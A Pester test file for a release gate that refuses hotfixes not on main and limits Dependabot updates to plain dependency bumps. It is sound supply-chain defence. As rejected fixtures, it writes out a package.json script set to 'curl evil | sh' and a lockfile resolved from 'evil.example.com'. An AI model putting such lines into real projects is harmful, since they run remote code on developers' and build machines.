#Requires -Modules @{ ModuleName='Pester'; ModuleVersion='5.0.0' }
<#
.SYNOPSIS
    tools/release/Assert-ReleaseFromMain.ps1 refuses releases of code that is
    not on main yet.

.DESCRIPTION
    Every case runs the real script against a throwaway git repository with a
    `main` branch, a v1.0.0 tag and a hotfix branch, so it exercises real git
    ancestry, real cherry-pick trailers and real patch-ids — not mocks.

    v6.0.1 was cut from a hotfix branch (a cherry-pick WITHOUT -x of an
    unapproved PR) before the fix reached main; 'refuses a fix that reached main
    only later as a different commit' is that exact shape.

.USAGE
    Invoke-Pester -Path test/unit/AssertReleaseFromMain.Tests.ps1 -Output Detailed
#>

BeforeAll {
    $root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent
    $script:Checker = Join-Path $root 'tools/release/Assert-ReleaseFromMain.ps1'

    function Invoke-Git { git @args 2>&1 | Out-Null; if ($LASTEXITCODE -ne 0) { throw "git $args failed" } }

    function Set-Lines([string] $File, [string[]] $Lines) {
        Set-Content -Path $File -Value $Lines -Encoding ascii
    }

    # Commits $Lines as app.txt and returns the new commit's SHA.
    function New-Commit([string[]] $Lines, [string] $Message) {
        Set-Lines 'app.txt' $Lines
        Invoke-Git add app.txt
        Invoke-Git commit -q -m $Message
        return (git rev-parse HEAD).Trim()
    }

    # Runs the checker in its own process, as the workflows do.
    function Invoke-Checker([string] $Mode, [string] $Ref) {
        $out = pwsh -NoProfile -File $script:Checker -Mode $Mode -Ref $Ref -Main main 2>&1
        [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = ($out -join "`n") }
    }

    # main: base -> v1.0.0 -> feature (unreleased) -> fix (touches line 1).
    # The fix's diff is identical whether applied to main or to v1.0.0.
    $script:Base = @('line1', 'line2', 'line3', 'line4', 'line5', 'line6', 'line7', 'line8')
    function New-Repo {
        $dir = Join-Path $TestDrive ([guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory $dir | Out-Null
        Set-Location $dir
        Invoke-Git init -q -b main
        Invoke-Git config user.email t@example.com
        Invoke-Git config user.name tester
        Invoke-Git config commit.gpgsign false
        New-Commit $script:Base 'base' | Out-Null
        Invoke-Git tag v1.0.0
        $feature = $script:Base[0..6] + 'feature'
        New-Commit $feature 'feature on main' | Out-Null
        $fixed = @('line1 FIXED') + $feature[1..7]
        $script:MainFix = New-Commit $fixed 'fix on main (squash of an approved PR)'
    }
}

AfterAll { Set-Location $PSScriptRoot }

Describe 'Assert-ReleaseFromMain -Mode Release' {
    BeforeEach { New-Repo }

    It 'accepts a commit on main' {
        (Invoke-Checker Release main).ExitCode | Should -Be 0
    }

    It 'accepts an older commit on main (a tag cut from history)' {
        (Invoke-Checker Release v1.0.0).ExitCode | Should -Be 0
    }

    It 'refuses a branch commit that is not on main' {
        Invoke-Git checkout -q -b feature/unmerged
        New-Commit ($script:Base + 'extra') 'unmerged work' | Out-Null
        $r = Invoke-Checker Release feature/unmerged
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match "::error::.*'feature/unmerged'.*is not on main"
    }

    It 'fails for a ref that does not exist instead of passing' {
        (Invoke-Checker Release no-such-branch).ExitCode | Should -Not -Be 0
    }
}

Describe 'Assert-ReleaseFromMain -Mode Hotfix' {
    BeforeEach {
        New-Repo
        Invoke-Git checkout -q -b bugfixes/hotfix v1.0.0
    }

    It 'accepts a clean cherry-pick -x of a commit on main' {
        Invoke-Git cherry-pick -x $script:MainFix
        $r = Invoke-Checker Hotfix bugfixes/hotfix
        $r.Output | Should -Match '^OK:'
        $r.ExitCode | Should -Be 0
    }

    It 'refuses a cherry-pick without -x (no record of the main commit)' {
        Invoke-Git cherry-pick $script:MainFix
        $r = Invoke-Checker Hotfix bugfixes/hotfix
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match "not a 'git cherry-pick -x' of a commit on main"
    }

    # The v6.0.1 shape: fixed on the hotfix branch first; main got its own commit.
    It 'refuses a fix committed on the hotfix branch, even if main has the same change' {
        New-Commit (@('line1 FIXED') + $script:Base[1..7]) 'fix written on the hotfix branch' | Out-Null
        (Invoke-Checker Hotfix bugfixes/hotfix).ExitCode | Should -Be 1
    }

    It 'refuses a -x trailer that points at a commit not on main' {
        Invoke-Git checkout -q -b bugfixes/unapproved main~1
        $unapproved = New-Commit (@('line1 UNREVIEWED') + $script:Base[1..6] + 'feature') 'open PR'
        Invoke-Git checkout -q bugfixes/hotfix
        Invoke-Git cherry-pick -x $unapproved
        $r = Invoke-Checker Hotfix bugfixes/hotfix
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match "cherry-picked from $($unapproved.Substring(0, 9)), which is not on main"
    }

    It 'refuses a cherry-pick whose changed lines differ from the main commit' {
        Invoke-Git cherry-pick -x --no-commit $script:MainFix
        Set-Lines 'app.txt' (@('line1 FIXED', 'line2 SNUCK IN') + $script:Base[2..7])
        Invoke-Git add app.txt
        Invoke-Git commit -q -m "fix`n`n(cherry picked from commit $($script:MainFix))"
        $r = Invoke-Checker Hotfix bugfixes/hotfix
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'changes different lines than'
    }

    It 'refuses when one of several commits is unreviewed' {
        Invoke-Git cherry-pick -x $script:MainFix
        New-Commit (@('line1 FIXED') + $script:Base[1..6] + 'tweak') 'extra unreviewed tweak' | Out-Null
        $r = Invoke-Checker Hotfix bugfixes/hotfix
        $r.ExitCode | Should -Be 1
        ([regex]::Matches($r.Output, '::error::')).Count | Should -Be 1
    }

    It 'refuses a hotfix branch with nothing after the tag' {
        $r = Invoke-Checker Hotfix bugfixes/hotfix
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'no commits after v1.0.0'
    }

    # A pre-release tag must not become the base: that would wave through every
    # commit between the last stable release and the rc.
    It 'measures from the latest stable tag, ignoring pre-release tags' {
        Invoke-Git cherry-pick -x $script:MainFix
        Invoke-Git tag v1.0.1
        New-Commit (@('line1 FIXED') + $script:Base[1..6] + 'rc work') 'unreviewed, only in an rc' | Out-Null
        Invoke-Git tag v1.0.2-rc.1
        $r = Invoke-Checker Hotfix bugfixes/hotfix
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match "not a 'git cherry-pick -x'"
    }

    It 'refuses a branch with no stable release tag in its history' {
        Invoke-Git checkout -q --orphan bugfixes/orphan
        New-Commit @('x') 'unrelated root' | Out-Null
        $r = Invoke-Checker Hotfix bugfixes/orphan
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'no stable release tag'
    }
}

# The one exception to "main first": Dependabot's updates of the release line
# (release/X.Y for a vX.Y.* tag) may be released without being on main, because
# they cannot be cherry-picked onto a lockfile that drifted from main's. Each
# case changes ONE thing about an otherwise accepted update, so a refusal can
# only come from that one thing.
Describe 'Assert-ReleaseFromMain -Mode Hotfix: Dependabot updates of the release line' {
    BeforeAll {
        $script:Bot = '49699333+dependabot[bot]@users.noreply.github.com'
        $script:ManifestJson = @'
{
  "name": "api",
  "version": "1.0.0",
  "scripts": { "test": "vitest" },
  "dependencies": { "hono": "^4.13.14", "@hono/node-server": "2.1.5" },
  "devDependencies": { "eslint": "^10.13.0" }
}
'@
        $script:Lock = @('{', '  "packages": {', '    "node_modules/hono": {', '      "version": "4.13.14",',
            '      "resolved": "https://registry.npmjs.org/hono/-/hono-4.13.14.tgz"', '    }', '  }', '}')
        $script:Dockerfile = @('FROM node:24-alpine@sha256:aaaa AS build', 'RUN npm ci --omit=dev', 'FROM node:24-alpine@sha256:aaaa')

        # Values are line arrays, or a hashtable written as JSON.
        function Write-Files([hashtable] $Files) {
            foreach ($path in $Files.Keys) {
                $parent = Split-Path $path -Parent
                if ($parent) { New-Item -ItemType Directory -Force $parent | Out-Null }
                $value = $Files[$path]
                $lines = if ($value -is [System.Collections.IDictionary]) { $value | ConvertTo-Json -Depth 10 } else { $value }
                Set-Content -Path $path -Value $lines -Encoding ascii
                Invoke-Git add $path
            }
        }

        # Commits $Files as Dependabot (or $Author), merged by $Committer.
        function New-UpdateCommit([hashtable] $Files, [string] $Author = $script:Bot, [string] $Committer = 'noreply@github.com') {
            Write-Files $Files
            $env:GIT_AUTHOR_NAME = 'dependabot[bot]'; $env:GIT_AUTHOR_EMAIL = $Author
            $env:GIT_COMMITTER_NAME = 'GitHub'; $env:GIT_COMMITTER_EMAIL = $Committer
            try { Invoke-Git commit -q -m 'build: Bump hono from 4.13.14 to 4.13.18 in /app/api (#1598)' }
            finally { Remove-Item Env:GIT_AUTHOR_NAME, Env:GIT_AUTHOR_EMAIL, Env:GIT_COMMITTER_NAME, Env:GIT_COMMITTER_EMAIL }
        }

        function Copy-Manifest { $script:ManifestJson | ConvertFrom-Json -AsHashtable }
        function Get-BumpedManifest { $m = Copy-Manifest; $m.dependencies.hono = '^4.13.18'; $m }
        function Get-BumpedLock { $script:Lock -replace '4\.13\.14', '4.13.18' }

        function Invoke-LineChecker([string] $Ref) {
            $out = pwsh -NoProfile -File $script:Checker -Mode Hotfix -Ref $Ref -Main main -ReleaseBranchPrefix 'release/' 2>&1
            [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = ($out -join "`n") }
        }
    }

    # main: base (with the dependency files) -> v1.0.0 -> drift on main.
    # release/1.0 starts at v1.0.0.
    BeforeEach {
        $dir = Join-Path $TestDrive ([guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory $dir | Out-Null
        Set-Location $dir
        Invoke-Git init -q -b main
        Invoke-Git config user.email t@example.com
        Invoke-Git config user.name tester
        Invoke-Git config commit.gpgsign false
        Write-Files @{ 'app/api/package.json' = (Copy-Manifest); 'app/api/package-lock.json' = $script:Lock; 'app/api/Dockerfile' = $script:Dockerfile }
        Invoke-Git commit -q -m base
        Invoke-Git tag v1.0.0
        Write-Files @{ 'app.txt' = @('main moved on') }
        Invoke-Git commit -q -m 'feature on main'
        $script:MainFeature = (git rev-parse HEAD).Trim()
        Invoke-Git checkout -q -b release/1.0 v1.0.0
    }

    It 'accepts a version bump of package.json and its lockfile' {
        New-UpdateCommit @{ 'app/api/package.json' = (Get-BumpedManifest); 'app/api/package-lock.json' = (Get-BumpedLock) }
        $r = Invoke-LineChecker release/1.0
        $r.Output | Should -Match '^OK:'
        $r.ExitCode | Should -Be 0
    }

    It 'accepts a base image bump that only changes FROM lines' {
        New-UpdateCommit @{ 'app/api/Dockerfile' = ($script:Dockerfile -replace 'aaaa', 'bbbb') }
        (Invoke-LineChecker release/1.0).ExitCode | Should -Be 0
    }

    It 'accepts several updates with a clean cherry-pick of main between them' {
        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) }
        Invoke-Git cherry-pick -x $script:MainFeature
        New-UpdateCommit @{ 'app/api/Dockerfile' = ($script:Dockerfile -replace 'aaaa', 'bbbb') }
        (Invoke-LineChecker release/1.0).ExitCode | Should -Be 0
    }

    It 'refuses the same change when someone else authored it' {
        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) } -Author 'someone@example.com'
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'not a Dependabot update of the release line'
    }

    It 'refuses a Dependabot commit that was not merged through GitHub (pushed with a copied author)' {
        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) } -Committer 'someone@example.com'
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'not merged through a GitHub pull request'
    }

    It 'refuses a Dependabot commit that is not on the release line of the base tag' {
        Invoke-Git checkout -q -b bugfixes/elsewhere v1.0.0
        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) }
        $r = Invoke-LineChecker bugfixes/elsewhere
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'is not on release/1\.0, the release line of v1\.0\.0'
    }

    It 'refuses a Dependabot commit that also touches code' {
        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock); 'app/api/src/index.js' = @('evil()') }
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'changes app/api/src/index\.js, which is not a dependency file'
    }

    It 'refuses a package.json change outside the dependency lists (a script)' {
        $m = Get-BumpedManifest; $m.scripts.test = 'curl evil | sh'
        New-UpdateCommit @{ 'app/api/package.json' = $m }
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'outside its dependency lists'
    }

    It 'refuses a dependency pointed at something other than a plain version' {
        $m = Copy-Manifest; $m.dependencies.hono = 'git+https://example.com/hono.git'
        New-UpdateCommit @{ 'app/api/package.json' = $m }
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match "sets hono to 'git\+https://example\.com/hono\.git', which is not a plain version"
    }

    It 'refuses a dependency that is added rather than bumped' {
        $m = Get-BumpedManifest; $m.dependencies['left-pad'] = '1.3.0'
        New-UpdateCommit @{ 'app/api/package.json' = $m }
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match "adds or removes a dependency in 'dependencies'"
    }

    It 'refuses a lockfile entry resolved outside the npm registry' {
        New-UpdateCommit @{ 'app/api/package-lock.json' = ((Get-BumpedLock) -replace 'https://registry\.npmjs\.org/', 'https://evil.example.com/') }
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'outside registry\.npmjs\.org'
    }

    It 'refuses a Dockerfile change beyond the FROM lines' {
        New-UpdateCommit @{ 'app/api/Dockerfile' = ($script:Dockerfile -replace 'npm ci --omit=dev', 'npm ci') }
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        $r.Output | Should -Match 'more than a FROM line'
    }

    It 'still refuses an unreviewed commit next to an accepted update, naming only that one' {
        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) }
        Write-Files @{ 'app.txt' = @('unreviewed') }
        Invoke-Git commit -q -m 'pushed straight to the line'
        $r = Invoke-LineChecker release/1.0
        $r.ExitCode | Should -Be 1
        ([regex]::Matches($r.Output, '::error::')).Count | Should -Be 1
    }
}
